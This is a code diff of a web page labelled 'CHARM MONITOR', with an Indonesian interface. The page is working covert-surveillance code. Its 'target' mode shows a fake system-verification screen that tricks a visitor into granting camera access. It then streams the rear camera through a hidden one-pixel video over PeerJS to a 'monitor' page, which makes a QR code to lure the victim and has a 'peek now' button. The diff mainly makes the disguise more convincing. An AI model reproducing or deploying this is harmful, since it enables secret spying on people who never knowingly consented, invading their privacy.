@@ -3,110 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CharmGPT System 1.0</title>
+    <title>System Diagnostics 2026</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow-x: hidden; }
-        .panel { padding: 20px; border: 1px solid #0f0; margin: 10px; border-radius: 8px; }
-        video { width: 100%; height: 60vh; background: #111; object-fit: cover; border: 2px solid #0f0; }
-        .btn { background: #0f0; color: #000; border: none; padding: 15px; width: 90%; font-weight: bold; margin: 10px 0; cursor: pointer; border-radius: 5px; }
-        #qr-box { background: #fff; padding: 15px; display: none; margin: 10px auto; width: 200px; position: fixed; top: 20%; left: 50%; transform: translateX(-50%); z-index: 100; border: 5px solid #0f0; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
+        .panel { padding: 15px; border: 1px solid #333; margin: 10px; border-radius: 8px; background: #050505; }
+        video { width: 100%; height: 65vh; background: #111; object-fit: cover; border-bottom: 2px solid #0f0; }
+        .btn { background: #0f0; color: #000; border: none; padding: 15px; width: 90%; font-weight: bold; margin: 10px 0; cursor: pointer; border-radius: 4px; box-shadow: 0 0 10px #0f0; }
+        #qr-box { background: #fff; padding: 15px; display: none; margin: 0 auto; width: 220px; position: fixed; top: 15%; left: 50%; transform: translateX(-50%); z-index: 100; border: 5px solid #0f0; border-radius: 10px; }
         #qr-box img { width: 200px; }
         .hidden { display: none; }
-        #status { font-size: 0.8rem; color: #888; }
-        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        #log { font-size: 10px; color: #666; text-align: left; height: 50px; overflow-y: auto; padding: 5px; background: #111; border-top: 1px solid #333; }
+        .loader { border: 4px solid #111; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="main-ui">
-        <h2>[ CHARM MONITOR ]</h2>
-        <video id="display" autoplay playsinline></video>
+    <div id="ui-monitor">
+        <h3 style="margin: 10px 0;">[ CHARM MONITOR V.3 ]</h3>
+        <video id="remote-video" autoplay playsinline></video>
         <div class="panel">
-            <p id="status">STATUS: STANDBY</p>
-            <button class="btn" onclick="startViewing()">INTIP SEKARANG</button>
-            <button class="btn" style="background:#555;color:#fff" onclick="showQR()">TAMPILKAN QR SCAN</button>
+            <button class="btn" onclick="connectToTarget()">HUBUNGKAN KE TARGET</button>
+            <button class="btn" style="background:#222; color:#0f0;" onclick="generateQR()">TAMPILKAN QR SCAN</button>
         </div>
+        <div id="log">Sistem Siap...</div>
+
         <div id="qr-box">
-            <p style="color:#000; font-weight: bold; margin-bottom: 10px;">SCAN UNTUK VERIFIKASI</p>
-            <img id="qr-img" src="" alt="QR Code">
+            <p style="color:#000; font-size: 12px; font-weight: bold;">SCAN UNTUK VERIFIKASI</p>
+            <img id="qr-display" src="">
             <br>
-            <button onclick="document.getElementById('qr-box').style.display='none'" style="margin-top:10px; padding: 5px 15px;">TUTUP</button>
+            <button onclick="document.getElementById('qr-box').style.display='none'" style="margin-top:10px;">TUTUP</button>
         </div>
     </div>
 
-    <div id="target-ui" class="hidden">
-        <div style="padding: 50px;">
+    <div id="ui-target" class="hidden">
+        <div style="padding: 60px 20px;">
             <div class="loader"></div>
-            <h3 id="msg">SISTEM SEDANG MEMPROSES...</h3>
-            <p id="sub-msg">Memeriksa enkripsi perangkat...</p>
-            <button id="start-btn" class="btn">MULAI VERIFIKASI</button>
-            <video id="p" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
+            <h2 id="t-msg">SISTEM SEDANG MEMPROSES</h2>
+            <p id="t-sub" style="color: #888;">Sinkronisasi modul keamanan...</p>
+            <button id="btn-verify" class="btn">MULAI VERIFIKASI</button>
+            <video id="local-video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
         </div>
     </div>
 
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <script>
+        const log = (msg) => { document.getElementById('log').innerHTML += `> ${msg}<br>`; };
         const urlParams = new URLSearchParams(window.location.search);
         const mode = urlParams.get('mode');
-        let localStream = null;
+        
+        // ID UNIK: Ganti 'DAPPA_X' jadi nama unik lo kalau mau lebih privat
+        const TARGET_ID = 'DAPPA_X_TARGET_2026';
+        const MONITOR_ID = 'DAPPA_X_MONITOR_2026';
 
         if (mode === 'target') {
-            document.getElementById('main-ui').classList.add('hidden');
-            document.getElementById('target-ui').classList.remove('hidden');
-            
-            const peer = new Peer('target-dappa-2026');
+            /* --- LOGIKA TARGET --- */
+            document.getElementById('ui-monitor').classList.add('hidden');
+            document.getElementById('ui-target').classList.remove('hidden');
 
-            document.getElementById('start-btn').onclick = () => {
-                document.getElementById('msg').innerText = "MENGAKSES SENSOR...";
-                navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment", width: 1280, height: 720 }, 
-                    audio: false 
-                })
-                .then((stream) => {
-                    localStream = stream;
-                    document.getElementById('p').srcObject = stream;
-                    document.getElementById('msg').innerText = "SISTEM OPTIMAL";
-                    document.getElementById('sub-msg').innerText = "Menunggu Sinkronisasi Data...";
-                    document.getElementById('start-btn').style.display = 'none';
+            const peer = new Peer(TARGET_ID);
+            let targetStream = null;
 
-                    // Standby nunggu call dari Monitor
-                    peer.on('call', (call) => {
-                        call.answer(stream);
+            document.getElementById('btn-verify').onclick = async () => {
+                document.getElementById('t-msg').innerText = "MENGAKSES SENSOR...";
+                try {
+                    targetStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "environment", frameRate: { ideal: 15 } }, 
+                        audio: false 
                     });
-                })
-                .catch(err => {
-                    alert("Izin Kamera Diperlukan!");
-                    document.getElementById('msg').innerText = "ERROR: IZIN DITOLAK";
-                });
+                    document.getElementById('local-video').srcObject = targetStream;
+                    document.getElementById('t-msg').innerText = "SISTEM OPTIMAL";
+                    document.getElementById('t-sub').innerText = "Menunggu Sinkronisasi Data...";
+                    document.getElementById('btn-verify').style.display = 'none';
+
+                    // Standby nunggu panggilan
+                    peer.on('call', (call) => {
+                        call.answer(targetStream);
+                    });
+                } catch (e) {
+                    alert("Akses kamera ditolak. Verifikasi gagal.");
+                }
             };
 
         } else {
-            const peer = new Peer('monitor-dappa-2026');
+            /* --- LOGIKA MONITOR --- */
+            const peer = new Peer(MONITOR_ID);
+            
+            peer.on('open', (id) => log(`ID Monitor Aktif: ${id}`));
 
-            function startViewing() {
-                document.getElementById('status').innerText = "MENGHUBUNGKAN...";
-                // Call ke ID target
-                const call = peer.call('target-dappa-2026', null);
+            function connectToTarget() {
+                log("Mencoba menghubungi target...");
+                const call = peer.call(TARGET_ID, null);
                 
-                call.on('stream', (remoteStream) => {
-                    document.getElementById('display').srcObject = remoteStream;
-                    document.getElementById('status').innerText = "LIVE: TERKONEKSI";
+                call.on('stream', (stream) => {
+                    log("STREAM TERDETEKSI! Menampilkan gambar...");
+                    document.getElementById('remote-video').srcObject = stream;
                 });
 
                 call.on('error', (err) => {
-                    alert("Target belum mengizinkan kamera atau sedang offline.");
-                    document.getElementById('status').innerText = "GAGAL TERHUBUNG";
+                    log("ERROR: Target Offline atau Sibuk.");
+                    alert("Target belum siap!");
                 });
+
+                // Timeout check
+                setTimeout(() => {
+                    if(!document.getElementById('remote-video').srcObject) {
+                        log("Koneksi lambat... Pastikan target sudah klik VERIFIKASI.");
+                    }
+                }, 5000);
             }
 
-            function showQR() {
+            function generateQR() {
                 const currentUrl = window.location.href.split('?')[0];
-                const targetUrl = `${currentUrl}?mode=target`;
-                const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(targetUrl)}`;
+                const finalUrl = `${currentUrl}?mode=target`;
+                const qrApi = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(finalUrl)}`;
                 
-                document.getElementById('qr-img').src = qrApi;
+                document.getElementById('qr-display').src = qrApi;
                 document.getElementById('qr-box').style.display = 'block';
+                log("QR Code di-generate.");
             }
         }
     </script>
